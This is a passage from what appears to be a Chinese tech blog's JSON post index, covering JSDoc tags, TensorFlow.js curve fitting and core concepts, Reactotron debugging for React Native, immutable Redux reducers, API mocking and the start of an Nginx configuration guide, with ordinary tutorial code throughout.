@type @param 等标签中使用。 @this说明此处 this 所指代的内容。 @global全局标识。 @inner内部属性或方法的标识，使用后可以通过 Parent~Child 的方式来引用。 @ignore告诉 JSDoc 忽略这部分代码。 @version [1.0.0]版本号。 @since表明该内容出现在一个特定的版本之后。 @class [&lt;type&gt; &lt;name&gt;]标识一个函数为构造函数，可以用 new 的方式实例化。 @classdesc &lt;some description&gt;与 @class 结合使用，与 @desc 不同，@classdesc 是对类的描述，而 @desc 是对类的构造函数的描述。 @member [&lt;type&gt;] [&lt;name&gt;]标识类的属性。 @method [&lt;FunctionName&gt;]标识类的方法。 @public标识类的属性或方法的访问范围是 public。 @private标识类的属性或方法的访问范围是 private。 @protected标识类的属性或方法的访问范围是 protected。 @instance实例属性或方法的标识。 @static静态属性或方法的标识。 @constructs &lt;name&gt;当使用对象直接量去定义类时，可以通过 @constructs 标识某个函数为类的构造函数，不要和 @class 同时使用，否则会在文档中出现两个同名的类。 @lends &lt;namepath&gt;把对象直接量的属性和方法指定为某个类的属性和方法。 @extends &lt;namepath&gt;用来表明继承关系。 @abstract标识子类必须实现或重写父类的此方法。 @override表明此方法是重写了父类的同名方法。 @interface [&lt;name&gt;]定义接口。 @implements {typeExpression}实现了某个接口。 @module [[{&lt;type&gt;}] &lt;moduleName&gt;]定义一个模块。 @exports &lt;moduleName&gt;当不是用 exports 或者 module.exports 对外提供模块接口时，需要使用 @exports 而不是 @module。 @requires &lt;someModuleName&gt;需要某个模块。 @alias &lt;aliasNamepath&gt;告诉 JSDoc 在生成文档时用另一个 namepath 去处理当前的内容。@alias 不同于 @name，@name 会告诉 JSDoc 忽略这部分代码。 @name &lt;namepath&gt;使用 @name 时，需要提供很多其他的注释，如 @type 等，因为 JSDoc 会忽略这部分代码，适用于在运行时才生成的函数等。 @inheritdoc继承父类的注释。 @mixin [&lt;MixinName&gt;]表明当前对象的属性和方法可以被添加到另一个对象中。 @mixes &lt;OtherObjectPath&gt;将带有 @mixin 标签的对象的属性和方法添加进来。 @see &lt;namepath&gt;页面里超链接的作用。 @link or @url {namepath}可以理解为注释中内联的 @see。 参考资料 https://github.com/jsdoc3/jsdoc https://blog.fundebug.com/2017/10/18/generate-docs-with-jsdoc/ http://ask.dcloud.net.cn/article/129","categories":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/categories/后端/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"}]},{"title":"TensorFlow.js 拟合曲线回归","slug":"TensorFlow/TensorFlow.js 拟合曲线回归.1","date":"2018-04-10T09:08:09.000Z","updated":"2021-06-15T06:10:52.896Z","comments":true,"path":"/stories/2018/04/TensorFlow/TensorFlow.js 拟合曲线回归.1/","link":"","permalink":"http://me.lizhooh.com/stories/2018/04/TensorFlow/TensorFlow.js 拟合曲线回归.1/","excerpt":"前言在本文中，使用 TensorFlow.js 将使用现有的数据来拟合一个曲线回归方程。 数据现在有一个数据集，把它可视化绘制在平面坐标系上，如下图所示：","text":"前言在本文中，使用 TensorFlow.js 将使用现有的数据来拟合一个曲线回归方程。 数据现在有一个数据集，把它可视化绘制在平面坐标系上，如下图所示： 这些数据是由 y = ax3 + bx2 + cx + d 的三元多项式函数生产的，但并不知道其中 a、b、c、d 的值。下面的任务就是通过使用 TensorFlow.js 通过训练来找出这个多项式函数的 a、b、c、d 最合适的值。 设置变量首先，让我们创建一些 Variable，以在模型训练的每个步骤中保持我们对这些值的当前最佳估计。 一开始的时候，为每个都设置一个随机数。 1234const a = tf.variable(tf.scalar(Math.random()));const b = tf.variable(tf.scalar(Math.random()));const c = tf.variable(tf.scalar(Math.random()));const d = tf.variable(tf.scalar(Math.random())); 建立模型通过使用一系列的数学函数，定义一个模型。一般模型为函数，在这里模型为 y 函数。 12345678function predict(x) &#123; return tf.tidy(() =&gt; a.mul(x.pow(tf.scalar(3))) // a * x^3 .add(b.mul(x.square())) // + b * x ^ 2 .add(c.mul(x)) // + c * x .add(d) // + d );&#125; 现在，绘制一个 a、b、c、d 为随机的多项式函数看看，很明显除了骨架相似外，整条函数线并没有和数据对齐，因为该模型还没有学习到更好的系数值。 训练模型为了训练模型，现在需要定义三件事情： 损失函数：是衡量一个给定的多项式吻合程度的数据。损失值越低，多项式越适合数据。 优化器：它根据损失函数的输出执行修正我们的系数值的算法。优化器的目标是最小化损失函数的输出值。 训练循环：它将迭代地运行优化器以最小化损失计算。 定义损失函数对于本数据集来说，选择的是 均方误差（MSE） 作为损失函数。通过对数据集中每个 x 值的实际 y 值和预测 y 值之间的差值进行平方，然后取所有结果项的期望值。 定义损失函数函数如下： 123456789/** * predictions: 预测值 * labels: 实际值 * （预测值 - 实际值）^2 的期望值 */function loss(predictions, labels) &#123; const meanSquareError = predictions.sub(labels).square().mean(); return meanSquareError;&#125; 定义优化器对于优化器，选择的是 随机梯度下降（SGD）。SGD 通过获取数据集中随机点的梯度并使用其值来通知是增加还是减少模型系数的值。TensorFlow.js 为执行 SGD 提供了一种便利功能，因此不必担心是否需要造轮子。tf.train.sdg 以期望的学习速率作为输入，并且返回 SGDOptimizer（优化器）可以被调用以优化损失函数的值的对象。 下面定义了一个优化器，学习的速率为 0.5： 12const learningRate = 0.5;const optimizer = tf.train.sgd(learningRate); 定义训练循环现在已经定义了损失函数和优化器，接下来定义一个训练循环，迭代执行SGD以优化模型的系数以最小化损失（MSE）。 123456789101112131415/** * xs: X 集合 * ys: Y 集合 */function train (xs, ys, numIterations = 75) &#123; const learningRate = 0.5; // 学习速率 const optimizer = tf.train.sgd(learningRate); // 优化器 for (let iter = 0; iter &lt; numIterations; iter++) &#123; optimizer.minimize(() =&gt; &#123; const predsYs = predict(xs); // 训练模型，返回预测 Y 集合 return loss(predsYs, ys); // 损失函数 &#125;); &#125;&#125; 说明： 在每一次训练的时候，多项式的系数（a、b、c、d）的值都会变化，因为它们是一个 tf.variable。 minimize 会自动调整该函数中使用的变量（这里是系数 a、b、c、d）。 训练完毕后，还需要释放 GPU 的内存，以免内存泄漏。 123456train(xs, ys);// some timea.dispose();b.dispose();c.dispose();d.dispose(); 查看结果结果出乎意料，通过不断的训练，得出合适的多项式系数值，以完成任务。 最后，得出的函数为：y = -0.809x3 + -0.214x2 + 0.965x + 0.557。 我们可以使用这个函数去预测 X &gt; 1.0 的 Y 值，做更多有趣的事情。 参考资料 https://js.tensorflow.org/tutorials/fit-curve.html","categories":[{"name":"TensorFlow","slug":"TensorFlow","permalink":"http://me.lizhooh.com/categories/TensorFlow/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"深度学习","slug":"深度学习","permalink":"http://me.lizhooh.com/tags/深度学习/"},{"name":"TensorFlow","slug":"TensorFlow","permalink":"http://me.lizhooh.com/tags/TensorFlow/"}]},{"title":"TensorFlow.js 中的核心概念","slug":"TensorFlow/TensorFlow.js 中的核心概念","date":"2018-04-09T09:08:09.000Z","updated":"2021-06-15T06:10:52.895Z","comments":true,"path":"/stories/2018/04/TensorFlow/TensorFlow.js 中的核心概念/","link":"","permalink":"http://me.lizhooh.com/stories/2018/04/TensorFlow/TensorFlow.js 中的核心概念/","excerpt":"前言在 TensorFlow 开发者峰会上 Google 发布了 TensorFlow.js，这意味着用户可以完全在浏览器定义、训练和运行机器学习模型。TensorFlow.js 基于 WebGL 能够在浏览器上实现 GPU 快速计算，真正的让你在浏览器上进行深度学习的训练。 TensorFlow.js 提供了用于机器学习的低级构建模块，以及用于构建神经网络的高级 Keras 启发式 API。我们来看看库的一些核心组件。","text":"前言在 TensorFlow 开发者峰会上 Google 发布了 TensorFlow.js，这意味着用户可以完全在浏览器定义、训练和运行机器学习模型。TensorFlow.js 基于 WebGL 能够在浏览器上实现 GPU 快速计算，真正的让你在浏览器上进行深度学习的训练。 TensorFlow.js 提供了用于机器学习的低级构建模块，以及用于构建神经网络的高级 Keras 启发式 API。我们来看看库的一些核心组件。 安装： 1npm install @tensorflow/tfjs 张量（Tensors）TensorFlow.js 中数据的中心单位是张量：一组数值形成一个或多个维度的数组（实际上跟矩阵类似）。一个 Tensor 实例具有一个 shape 定义数组形状的属性。 创建一个 Tensor，使用 tf.tensor 构造函数。 123456789101112131415const tf = require('@tensorflow/tfjs');const shape = [2, 3]; // 2 x 3 Tensor，2 rows, 3 columnsconst a = tf.tensor([1.0, 2.0, 3.0, 10.0, 20.0, 30.0], shape);a.print(); // print Tensor values// Output: [[1 , 2 , 3 ],// [10, 20, 30]]const b = tf.tensor([ [1.0, 2.0, 3.0], [10.0, 20.0, 30.0]]);b.print();// Output: [[1 , 2 , 3 ],// [10, 20, 30]] 对于要创建特定维度的 Tensor，建议使用相关 API：tf.scalar（常量），tf.tensor1d（一维），tf.tensor2d（二维），tf.tensor3d（三维） 和 tf.tensor4d（四维）。 1234567const c = tf.tensor2d([ [1.0, 2.0, 3.0], [10.0, 20.0, 30.0]]);c.print();// Output: [[1 , 2 , 3 ],// [10, 20, 30]] Tensorflow.js 还提供创建 0 与 1 的 Tensor。 1234567// 3x5 Tensor with all values set to 0const zeros = tf.zeros([2, 2]);// Output: [[0, 0],// [0, 0]]const zeros = tf.ones([2, 2]);// Output: [[1, 1],// [1, 1]] 变量（Variables）变量类似于 Tensor，它用 Tensor 作为初始化数据。变量主要用于在模型训练期间存储和更新值。 1234567const initialValues = tf.zeros([5]); // Tensorconst biases = tf.variable(initialValues); // initialize biasesbiases.print(); // output: [0, 0, 0, 0, 0]const updatedValues = tf.tensor1d([0, 1, 0, 1, 0]);biases.assign(updatedValues); // 将新的 Tensor 赋值个变量biases.print(); // output: [0, 1, 0, 1, 0] 操作（Operations）张量用于存储数据，操作（ops）用于操作该数据。TensorFlow.js 提供了适用于线性代数和机器学习的各种操作，可以在 Tensor 上执行。因为 Tensor 是不变的，操作会返回新的 Tensor。 12345678910111213const d = tf.tensor2d([[1.0, 2.0], [3.0, 4.0]]);const d_squared = d.square(); // 矩阵平方d_squared.print();// Output: [[1, 4 ],// [9, 16]]const e = tf.tensor2d([[1.0, 2.0], [3.0, 4.0]]);const f = tf.tensor2d([[5.0, 6.0], [7.0, 8.0]]);const e_plus_f = e.add(f); // 加法e_plus_f.print();// Output: [[6 , 8 ],// [10, 12]] 并且操作后面是一个链式调用： 123e.add(f).square().print();// Output: [[36 , 64 ],// [100, 144]] 模型和图层（Models And Layers）从概念上讲，模型是一个函数，给定一些输入会产生一些期望的输出。在 TensorFlow.js 中有两种创建模型的方法。您可以直接使用 opt 来表示模型所做的工作。 123456789101112131415161718192021222324const tf = require('@tensorflow/tfjs');// 定义常量: y = 2x^2 + 4x + 8const a = tf.scalar(2);const b = tf.scalar(4);const c = tf.scalar(8);// 这是一个模型，给定输入，产生一些期望输出function predict(input) &#123; // 在 GPU 里计算 return tf.tidy(() =&gt; &#123; // y = a * x ^ 2 + b * x + c const x = tf.scalar(input); const ax2 = a.mul(x.square()); // a * x ^ 2 const bx = b.mul(x); // b * x const y = ax2.add(bx).add(c); // a * x ^ 2 + b * x + c return y; &#125;);&#125;// Predict output for input of 2const result = predict(2);result.print() // Output: 24 还可以使用高级 API tf.model 来构建一个不包含图层的模型，这是深度学习中比较常用的抽象。 TensorFlow.js中有许多不同类型的图层，以下代码构造了一个 tf.sequential 模型： 1234567891011121314const tf = require('@tensorflow/tfjs');const model = tf.sequential();model.add( tf.layers.simpleRNN(&#123; // RNN 图层 units: 20, recurrentInitializer: 'GlorotNormal', inputShape: [80, 4] &#125;));const optimizer = tf.train.sgd(LEARNING_RATE);model.compile(&#123; optimizer, loss: 'categoricalCrossentropy' &#125;);model.fit(&#123; x: data, y: labels )&#125;); 内存管理由于 TensorFlow.js 使用 GPU 来加速数学运算，因此在处理 Tensor 和 Variable 时需要管理 GPU 内存。 TensorFlow.js 提供了两个函数来帮助解决这个问题： dispose 和 tf.tidy。 dispose调用 dispose 清除 Tensor 或 Variable 并释放其 GPU 内存。 12345const x = tf.tensor2d([[0.0, 2.0], [4.0, 6.0]]);const x_squared = x.square();// ... somex.dispose();x_squared.dispose(); tf.tidy使用 dispose 进行大量 Tensor 操作时使用可能显得很麻烦。TensorFlow.js 提供了另一个函数：tf.tidy来释放内存，它仅对函数作用域内的范围起作用，但对于 GPU 只支持 Tensor。 tf.tidy 执行一个函数并清除所有创建的中间 Tensor，释放它们的 GPU 内存（并不清除内部函数的返回值）。使用 tf.tidy 将有助于防止应用程序中的内存泄漏，也可以用来更仔细地控制内存何时回收。 1234567const average = tf.tidy(() =&gt; &#123; const y = tf.tensor1d([1.0, 2.0, 3.0, 4.0]); const z = tf.ones([4]); return y.sub(z).square().mean();&#125;);average.print() // Output: 3.5 注意： 传递给的函数 tf.tidy 应该是同步的，并且不能返回 Promise，也不支持 async/await。 tf.tidy 不会清理 Variable。Variable 通常会持续到深度学习模型的整个生命周期，因此 tf.tidy 不会清理它们，您可以手动调用 dispose 来清理 Variable。 参考资料 https://js.tensorflow.org/tutorials/core-concepts.html","categories":[{"name":"TensorFlow","slug":"TensorFlow","permalink":"http://me.lizhooh.com/categories/TensorFlow/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"深度学习","slug":"深度学习","permalink":"http://me.lizhooh.com/tags/深度学习/"},{"name":"TensorFlow","slug":"TensorFlow","permalink":"http://me.lizhooh.com/tags/TensorFlow/"}]},{"title":"使用 Reactotron 来调试 React Native","slug":"React Native/使用 Reactotron 来调试 React Native","date":"2018-04-06T00:45:40.000Z","updated":"2021-06-15T06:10:52.870Z","comments":true,"path":"/stories/2018/04/React Native/使用 Reactotron 来调试 React Native/","link":"","permalink":"http://me.lizhooh.com/stories/2018/04/React Native/使用 Reactotron 来调试 React Native/","excerpt":"前言众所周知，在 React Native 里可以使用 Chrome Dev 工具来进行调试 React Native 应用。但是有一个问题是使用 Chrome 调试非常消耗内存，在 8G 内存的笔记本上调试系统经常显示内存不足（Android 模拟器 + Chrome 调试），并且还需要打开 JS Dev Mode 模式，让人觉得非常不方便。 Reactotron 正是为了解决这些麻烦的问题而出现的一个基于 socket.io 的 React 应用调试工具。","text":"前言众所周知，在 React Native 里可以使用 Chrome Dev 工具来进行调试 React Native 应用。但是有一个问题是使用 Chrome 调试非常消耗内存，在 8G 内存的笔记本上调试系统经常显示内存不足（Android 模拟器 + Chrome 调试），并且还需要打开 JS Dev Mode 模式，让人觉得非常不方便。 Reactotron 正是为了解决这些麻烦的问题而出现的一个基于 socket.io 的 React 应用调试工具。 它有以下特性： 查看你的应用状态。 显示 API 请求和响应。 执行快速性能基准。 订阅您的应用程序任何的数据状态。 显示类似于的 console.log 消息。 可以用于观测 Redux、Mobx-State-Tree 数据。 跟踪 React Native 中的异步存储（AsyncStorage）。 对 Mac、Window、Linux 多平台支持（基于 Electron 的）。 丰富的界面，数据显示效果。 哇！这不就是我想要的调试工具吗？ 安装Reactotron 是一个桌面工具，支持 Mac、Window、Linux 平台，使用之间先安装对应平台的文件：下载 Reactotron 基于 socket.io，在桌面应用里启动 Websocket 服务作为服务端，在 React/React Native 里作为客户端，利用 Websocket 的双向通信特点，进行数据的传递，从而让你很方便的就可以调试应用（只能使用日志调试，并不能打断点）。 Reactotron 支持 React 和 React Native，因为在 React 开发里，我们更多的是使用浏览器来调试，这里就忽略了 React。 安装模块： 1yarn add --dev reactotron-react-native 在 React Native 上使用在 React Native 上使用只需要连接和输出日志信息即可。 在 React Native 的入口文件里引入 reactotron 的模块，并且连接： 123456import rot from 'reactotron-react-native';rot .configure(&#123; name: 'React Native Demo' &#125;) .useReactNative() .connect(); 正常情况下，在 Reactotron 桌面应用里就可以看到连接信息了！（在 Android 模拟器里 Reload 一下！） 如果多次 Reload 都没有看到连接信息，请注意是否在 Wifi 或局域网里面，那么这时应该设置一下 ip 地址。 123456configure(&#123; name: 'React Native Demo', enabled: true, host: '192.168.3.11', // Reactotron 桌面应用的 ip，也就是 server ip port: 9090&#125;) 配置项都在上图里。 连接完成后，试一下输出日志信息： 123456789rot.log('hello rendering world');rot.warn('*glares*');rot.error('Now you\\'ve done it.');rot.display(&#123; name: 'ORANGE', preview: 'Who?', value: 'Orange you glad you don\\'t know me in real life?', important: true&#125;); 之后，在 Reactotron 应用里可以看到这样的输出信息。 扩展功能Reactotron 不只仅此用于输出日志信息，它还提供了许多扩展功能，这包括了：错误跟踪、RN 异步数据监听、网络数据监听、Redux 数据监听等。 要使用这些功能也非常简单，直接 use 即可。 12345678910111213141516171819202122import rot, &#123; trackGlobalErrors, openInEditor, overlay, asyncStorage, networking&#125; from 'reactotron-react-native';rot .configure(&#123; name: 'React Native Demo', host: '192.168.3.11', // Reactotron 桌面应用的 ip，也就是 server ip port: 9090 &#125;) .use(trackGlobalErrors(&#123; // 错误跟踪 veto: frame =&gt; !~frame.fileName.indexOf('/node_modules/react-native/') &#125;)) .use(openInEditor()) // 打开编辑器 .use(overlay()) // 图像叠加 .use(asyncStorage()) // RN 异步数据监听 .use(networking()) // 网络数据监听 .connect() 说明： trackGlobalErrors 是一个全局错误跟踪功能，一般来说会忽略来自于 RN 自身框架的错误。 openInEditor 是一个“打开编辑器”的选项，可以在调试面板里支持跳转到 vscode 里。 overlay 是一个图像叠加功能，可让您将图片上传到您的模拟器以保持您的应用程序的顶部。 asyncStorage 用于监听 RN 的异步数据变化。 networking 用于监听网络请求数据变化。 当 React Native 应用发出一个网络请求时，Reactotron 会自动捕捉网络请求内容，并且自动输出在桌面应用里，让人感觉可以很方便的调试网络请求。 跟踪 Redux 数据Reactotron 对 Redux 提供了非常不错的支持，这使得在 React Native 上调试 Redux 会变得非常的方便。 它有以下特点： 跟踪何时发布 Action，包括时间。 订阅 State Tree 内的更改。 根据需求提取 value。 查看 Types 列表。 从 Reactotron 里 Dispatch Action。 重放 Action（时间旅行）。 热切换应用数据状态。 要跟踪 Redux 数据，那么先安装模块： 1yarn add --dev reactotron-redux 接着使用它，并且更改一下 createStore 方法。 12345678910111213141516171819202122import &#123; reactotronRedux &#125; from 'reactotron-redux';import rot from 'reactotron-react-native';// ... 省略部分let _createStore;if (__DEV__) &#123; // 开发模式 rot .configure(&#123; name: 'React Native Demo' &#125;) .use(reactotronRedux()) .connect(); // 注意：要先 use reactotronRedux 后再 createStore _createStore = rot.createStore;&#125;else &#123; _createStore = createStore;&#125;export default store = createStore( combineReducers(reducers), compose(applyMiddleware(thunk))); 那么在 Reactotron 里，可以对 Redux 的数据进行跟踪。 主题Reactotron 现在为止只有一个主题，更多的主题进展。","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"单一 reducer immutable 化","slug":"Redux/单一 reducer immutable 化","date":"2018-04-03T02:08:35.000Z","updated":"2021-06-15T06:10:52.893Z","comments":true,"path":"/stories/2018/04/Redux/单一 reducer immutable 化/","link":"","permalink":"http://me.lizhooh.com/stories/2018/04/Redux/单一 reducer immutable 化/","excerpt":"前言往往在使用 React + Redux 开发大型单页面 Javascript 应用时，多多少少会使用 combindReducers 切分很多个 reducer，每一个 reducer 都独自处理着不同的 view。有些时候某个 view 需要很健壮的性能要求，而某些 view 对性能要求并不高，这时候应该考虑使用 “单一 reducer immutable 化 ” 的方案。","text":"前言往往在使用 React + Redux 开发大型单页面 Javascript 应用时，多多少少会使用 combindReducers 切分很多个 reducer，每一个 reducer 都独自处理着不同的 view。有些时候某个 view 需要很健壮的性能要求，而某些 view 对性能要求并不高，这时候应该考虑使用 “单一 reducer immutable 化 ” 的方案。 单一 reducer immutable 化针对的是：只对个别的 reducer 进行 immutable 化，而不是全局的 redux state 都被 immutable 化，从小的一方面优化 React 的渲染性能。 immutable 化使用到了 immutable.js 这个库，具体参考： 使用 immutable 进一步优化 React 性能 精通 immutable Map 与 List 切分 reducer在 Redux 里使用 combindReducers 函数可以将单个庞大的 reducer 切分为多个小的 reducer，这样做不仅有利于模块化，并且还能提升性能。 1234567891011import &#123; createStore, combineReducers &#125; from 'redux';// 注意每个 reducer 都是一个函数 (state, action) =&gt; new Stateconst reducers = &#123; root: (state, action) =&gt; state, home: (state, action) =&gt; state,&#125;;export default createStore( combineReducers(reducers),); 引申一点，每个 reducer 有一个文件去管理。 1234const reducers = &#123; root: require('./root'), home: require('./home'),&#125;; 在切分之后，约定 home 的分支需要做 immutable 化，其他分支不需要。 immutable 化immutable 化就意味着 state 是 immutable 对象，具体有以下表现： 在组件里 Object 与 Array 使用的是 immutable 里的 Map 与 List。 State 有 immutable 对象结构组成。 使用 immutable 时，需要注意对象与数组对应使用 Map 与 List。在 reducer 里可以直接返回 immutable 对象，这样 Store 里存储的是 immutable 对象，而不是普通的 Javascript 对象。 那么这样会不会影响使用 Redux-DevTool 调试？ 1234567891011121314151617181920212223242526import isFunction from 'is-function';import &#123; Map, List &#125; from 'immutable';const init_state = Map(&#123; list: List([ Map(&#123; id: 1, title: 'AAA', &#125;), Map(&#123; id: 2, title: 'BBB', &#125;), Map(&#123; id: 3, title: 'CCC', &#125;), ]),&#125;);export default (state = init_state, &#123; type, newState &#125;) =&gt; &#123; if (type === 'HOME' &amp;&amp; isFunction(newState)) &#123; return newState(state, init_state) || state; &#125; return state;&#125; 然而幸运的是，Redux DevTool 自动会帮你转化为 Object 来显示，这并不会影响调试。 State Tree 结构如下： Action在 action 里（特别是异步操作里），需要把数据转为 immutable 对象。 12345678910import &#123; Map, List, fromJS &#125; from 'immutable';export const init = () =&gt; async dispatch =&gt; &#123; // 从后端获取数据后，迅速转为 immutable 对象 const res = fromJS(await api.init()); dispatch(&#123; type: 'HOME', newState: state =&gt; state.update('list', list =&gt; list.push(res)), &#125;);&#125; 备注：数据更新使用 set，深度更新使用 setIn，深度更新操作大多都需要一个属性的递归路径如 state.setIn(&#39;list.0.title&#39;.split(&#39;.&#39;), &#39;DDD&#39;) 等价于 state.list[0].title = &#39;DDD&#39;。immutable 的更新操作是无副作用的，不会修改原来的对象，而是返回一个新的 immutable 对象。 组件在不用 immutable 时，组件里可以直接使用点的方式获取对象的属性，而使用了 immutable 后并不能这样做，因为 immutable 不是一个普通的对象，你需要使用 get 函数去获取 immutable 对象的属性。 1234567891011121314export default connect( state =&gt; (&#123; state: state.home &#125;),)(class App extends Component &#123; render() &#123; const state = this.props.state; return ( &lt;div&gt; &#123;state.get('list').map((item, index) =&gt; ( &lt;p key=&#123;index&#125;&gt;&#123;item.get('id')&#125; - &#123;item.get('title')&#125;&lt;/p&gt; ))&#125; &lt;/div&gt; ); &#125;&#125;) 在 React 里，组件分为两种类型：一种是容器组件，一种是展示组件。 说明 展示组件 容器组件 作用 描述如何展现（骨架、样式） 描述如何运行（数据获取、状态更新） 直接使用 Redux 否 是 数据来源 props 监听 Redux state 数据修改 从 props 调用回调函数 向 Redux 派发 actions 调用方式 手动 通常由 React Redux 生成 容器组件里，需要在 shouldComponentUpdate 做优化，因为容器组件是需要与 Redux 连接的，一般我会把连接的数据挂载到 props.state 里，因此比较 props.state 即可。 1234567import &#123; is &#125; from 'immutable';class ContainerBaseComponent extends Component &#123; shouldComponentUpdate(nextProps, nextState) &#123; return !is(this.props.state, nextProps.state); &#125;&#125; 展示组件里则需要比较 state 和 props。 1234567import &#123; is &#125; from 'immutable';class ViewBaseComponent extends Component &#123; shouldComponentUpdate(nextProps, nextState) &#123; return !is(this.state, nextState) &amp;&amp; !is(this.props, nextProps); &#125;&#125; 这样就可以让 React 以最优的时机去渲染虚拟 DOM 节点。 小结本文讲述的是如何在 Redux 里进行部分 reducer immutable 化。当某个 view 的性能要求很高时，使用 immutable 可以优化 React 性能。","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"前后端分离，使用 Mock 提升效率","slug":"前端/前后端分离，使用 Mock 提升效率","date":"2018-03-24T11:06:44.000Z","updated":"2021-06-15T06:10:52.906Z","comments":true,"path":"/stories/2018/03/前端/前后端分离，使用 Mock 提升效率/","link":"","permalink":"http://me.lizhooh.com/stories/2018/03/前端/前后端分离，使用 Mock 提升效率/","excerpt":"前言往往在进行前后端分离的开发里，如果不使用 Mock 的话，估计前端需要等后端完成部分 API，才能工作。这样一来，就不利于并行的项目进度开发。 Mock 服务是实现前后端分离和并行开发的核心内容。Mock 服务是针对于前后端分离模式下的工作任务不协调层面的问题，通过模拟数据解耦了前端逻辑的编写对后端接口的依赖，间接了提升了项目开发的效率。","text":"前言往往在进行前后端分离的开发里，如果不使用 Mock 的话，估计前端需要等后端完成部分 API，才能工作。这样一来，就不利于并行的项目进度开发。 Mock 服务是实现前后端分离和并行开发的核心内容。Mock 服务是针对于前后端分离模式下的工作任务不协调层面的问题，通过模拟数据解耦了前端逻辑的编写对后端接口的依赖，间接了提升了项目开发的效率。 相关工作要把接口 Mock 化，其实一点都不难，最难的部分是制定接口标准的部分。一个 Mock 服务能不能说是成功的，它很大原因取决于接口标准的制定是否完整。 在 Mock 之前需要做的准备是：前后端开发人员协定接口的规范细节，包括了请求方法名，输入参数，返回值等，这也是前后端分离的关键工作。 在制定了接口标准之后，后端工程师则以此规范为标准进行 API 的开发，而前端工程师就以此规范为标准，简单的部署 Mock 服务，并使用 Mock 数据编写前端逻辑，等待后端接口通过了测试之后，再做去 Mock 化工作，替换为真实的接口。 整个流程如下： 说明：制定接口标准的部分非常重要，如果在过程中接口的格式需要修改，会直接影响到前端 Mock 和视图，后端 API 开发两个部分。 Mock 化Mock 接口并不是什么都能 Mock 的，至少有一部分是不能模拟的。Mock 主要有以下特点： HTTP method 可以是任意。 HTTP 请求格式需要和真实的接口一致。 接口数据只有输出方式，没有输入方式。 不模拟与前端逻辑无关的数据，比如数据库操作，缓存层，Session 管理等。 Mock 的方式构建一个 Mock Server 可以简单也可以复杂，完全取决于项目的情况。 固定数据最简单的 Mock Server 方式是使用本地的 JSON 数据，数据内容通常是固定的。 例如，使用 serve 直接把 ./mock 文件夹下的 json 文件，公开到 3001 端口里。 1serve ./mock -p 3001 这样每次请求获取到的数据都是固定相同的。 随机数据比较常用的 Mock 方式是返回一些随机的数据，不过这样一来工作量可能会多一点。 下面是用 mock.js 来生成随机的数据。 12345678910111213141516171819202122232425import Mock from 'mockjs';const &#123; id, ctitle, cword, time, image, color, cname, integer &#125; = Mock.Random;const article = () =&gt; (&#123; id: id(), title: ctitle(), summary: cword(10, 100), content: cword(100, 10000), time: time('hh:mm:ss'), likes: [...new Array(integer(0, 100))].map(i =&gt; (&#123; uid: id(), avatar: image('120x120', color()), time: time(), &#125;)), comments: [...new Array(integer(0, 20))].map(i =&gt; (&#123; uid: id(), uname: cname(), avatar: image('120x120', color()), content: cword(10, 30), time: time(), &#125;)),&#125;));// 对应 API 路径export default Mock.mock('/api/test', article()); 小结Mock 是支持前后端分离和并行开发的核心内容。在部署 Mock 服务之前，前后端需要明确的制定好接口的标准。","categories":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/categories/前端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"}]},{"title":"前端工程师的 Nginx 学习笔记","slug":"Nginx/前端工程师的 Nginx 学习笔记","date":"2018-03-23T02:05:32.000Z","updated":"2021-06-15T06:10:52.831Z","comments":true,"path":"/stories/2018/03/Nginx/前端工程师的 Nginx 学习笔记/","link":"","permalink":"http://me.lizhooh.com/stories/2018/03/Nginx/前端工程师的 Nginx 学习笔记/","excerpt":"前言Nginx（发音：engine X）是一款轻量级的 HTTP 服务器（相比于 Apache、Lighttpd 而言），同时是一个高性能的 HTTP 和反向代理服务器，负载均衡服务器。Nginx 主要以事件驱动的方式编写，自带事件循环与异步，在性能上能够直接碾压 Apache 这种多线程处理的方式。","text":"前言Nginx（发音：engine X）是一款轻量级的 HTTP 服务器（相比于 Apache、Lighttpd 而言），同时是一个高性能的 HTTP 和反向代理服务器，负载均衡服务器。Nginx 主要以事件驱动的方式编写，自带事件循环与异步，在性能上能够直接碾压 Apache 这种多线程处理的方式。 Nginx 为 HTTP 服务器有以下基本特征： 处理静态文件，索引文件以及自动索引，打开文件描述符缓冲。 无缓存的反向代理加速，简单的负载均衡和容错。 FastCGI，简单的负载均衡和容错。 模块化的结构，包括 gzipping、byte ranges、chunked responses、以及 SSI-filter 等 filter。 支持 SSL 和 TLSSNI。 对于前端的同学来说，我们只需要学习 Nginx 的安装，配置，启动即可。 配置Nginx 的使用基本都是做一些配置项，下面来介绍 Nginx 相关的配置。 Nginx 的配置文件在nginx/conf/nginx.conf，打开它后可以看到有一些基本的配置模版。 配置项的结构大致如下： 12345678910111213# ...events &#123; # ...&#125;http &#123; # ... server &#123; # ... location xxx &#123; # ... &#125; &#125;&#125; 说明： events 是事件相关。 http 是 HTTP 相关，http/server 代表着一个 http 服务，每个 http 服务可以映射一个地址。 123456789101112131415161718192021222324252627282930server &#123; # Nginx 监听端口号 listen 80; # 服务器的名字，默认为 localhost，你也可以写成 aotu.jd.com，这样子就可以通过 aotu.jd.com 来访问 server_name localhost; # 代码放置的根目录 root /var/www/; # 编码 charset 